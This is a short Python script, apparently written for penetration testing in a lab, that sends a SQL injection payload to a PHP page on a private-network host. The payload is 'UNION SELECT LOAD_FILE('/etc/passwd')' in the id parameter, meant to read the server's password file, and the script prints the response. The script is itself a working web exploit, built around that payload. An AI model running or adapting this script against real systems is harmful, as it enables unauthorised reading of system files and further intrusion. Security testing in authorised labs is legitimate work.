import requests
from sys import argv
from colorama import Fore, Back, Style

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

#Configuration
target="172.16.113.157/cat.php"
url = "http://" + target
payload = {'id':"2 UNION SELECT LOAD_FILE('/etc/passwd')" }
parameters='y'
method='GET'



#proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#functions


def requests_get_params(url, payload):
    r = requests.get(url, params=payload, verify=False)
    response(r)

def requests_get_simple(url):
    r = requests.get(url, verify=False)
    response(r)

def response(get_response): 
    r = get_response
    print(format_text('Url is: ', r.url))
    print(format_text('Status_code is: ', r.status_code))
    print(format_text('Cookies is: ',r.cookies))
    print(format_text('Headers are: ', r.headers))
    print(format_text('Text is: ',r.text))

def format_text(title,item):
    cr='\r\n'
    section_break = cr + "*" * 25 +cr
    item = str(item)
    text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break
    return text

def main():

    if parameters == 'n':
        requests_get_simple(url)

    else:
        requests_get_params(url, payload)

#start

if __name__== "__main__":
    main()
